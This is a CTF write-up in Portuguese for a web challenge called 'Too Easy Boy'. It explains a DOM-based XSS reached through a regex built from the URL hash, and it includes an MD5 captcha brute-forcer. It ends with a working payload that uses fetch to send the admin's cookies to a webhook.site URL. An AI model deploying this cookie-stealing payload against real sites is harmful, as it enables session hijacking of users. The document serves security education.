# Too Easy Boy

- Data do desafio: 2020-05-01
- Categoria: web

O desafio nos dá uma página com o seguinte código-fonte:

```html
<html><head><h1>Too Easy Boy</h1><style></style></head><body><div> </div><header><h1> </h1></header><main><script>if(!location.hash.substr(1).length<1){
    var url = location.href; 
    var regExp = new RegExp(location.hash, "g");
    url = url.replace (regExp, " ");
    window.location.href = url;
}
</script></main></body></html>
```

No mesmo formato de desafios anteriores, há uma página `/contact` onde podemos enviar um link para o "admin". No código-fonte há uma dica para resolver o captcha: inserir uma string tal que os quatro primeiros caracteres do hash MD5 sejam iguais aos caracteres dados. Este script encontra uma string adequada para os caracteres passados como argumento:

```python
import sys
import hashlib

if len(sys.argv) < 2:
  print('Missing argument')

for i in range(1, 1000000):
  m = hashlib.md5()
  m.update(str(i).encode('utf-8'))
  h = m.hexdigest()[:4]
  if h == sys.argv[1][:4]:
    print(str(i) + ' - ' + h)
    break
```

Voltando à página principal, o código:

1. verifica se há um hash na URL;
2. cria uma regex com o hash;
3. substitui a regex na URL por espaços;
4. redireciona para a URL resultante.

Portanto, se acessarmos `http://159.65.249.122:3000/#teste` a regex criada será `#teste` e seremos redirecionados para `http://159.65.249.122:3000/`.

Uma forma de executar JS é redirecionar para `javascript:alert(1)`. Você pode testar isso inserindo `window.location.href = "javascript:alert(1)"` no console do navegador.

Por enquanto, nosso payload será `javascript:alert(1)`. Precisamos de uma regex no formato `#[regex]javascript:alert(1)` que resulte em um match com `http://159.65.249.122:3000/#[regex]`, ou seja, uma regex que faz referência a si mesma.

Vamos dividir a regex em três partes utilizando o operador lógico `|` (ou). Como a regex começa com `#`, vamos adicionar o quantificador `{2}` para evitar que o match comece apenas no hash da URL. Na segunda parte, vamos capturar toda a URL com `(.*)` até um caractere específico, como `\^`, que usaremos como delimitador. Na terceira parte, colocamos o caractere delimitador junto com payload: `^javascript...`.

Nossa regex é `#{2}|(.*)\^|^javascript...` e será utilizada na string `http://159.65.249.122:3000/#{2}|(.*)\^|^javascript...`.

- `##` (não há correspondência);
- qualquer caractere até `^` (corresponde à URL e a parte da regex, deixando apenas o payload);
` string iniciada com `javascript` (não há correspondência).

Com o payload funcionando, resta apenas enviar para o "admin" um comando para obter os cookies, como `fetch("http://webhook.site/{id}?cookie=" + document.cookie)`. O payload final é `http://159.65.249.122:3000/#{2}|(.*)\^|^javascript:fetch("https://webhook.site/{id}?c="+document.cookie)`

Flag: `HACKAFLAG{T1m3_t0_r3st4rt}`